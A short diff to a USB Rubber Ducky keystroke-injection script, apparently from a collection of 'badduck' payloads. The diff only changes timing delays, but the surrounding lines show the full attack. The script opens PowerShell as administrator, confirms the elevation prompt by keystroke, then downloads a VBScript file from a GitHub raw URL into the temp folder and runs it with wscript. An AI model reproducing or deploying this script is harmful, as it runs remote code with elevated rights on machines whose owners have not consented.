@@ -4,15 +4,15 @@ DELAY 1000
 
 REM Open windows start menu
 GUI
-DELAY 500
+DELAY 1000
 
 REM search powershell and run as admin
 STRING powershell
 DELAY 300
 CTRL SHIFT ENTER
-DELAY 300
+DELAY 500
 ALT Y
-DELAY 400
+DELAY 1000
 
 REM Download raw VBScript payload from Pastebin and execute via Wscript
 STRING iwr 'https://raw.githubusercontent.com/stefanlft/badduck_payloads/main/michael_jackson/payload.vbs' -OutFile $env:TEMP\s.vbs; wscript $env:TEMP\s.vbs; exit
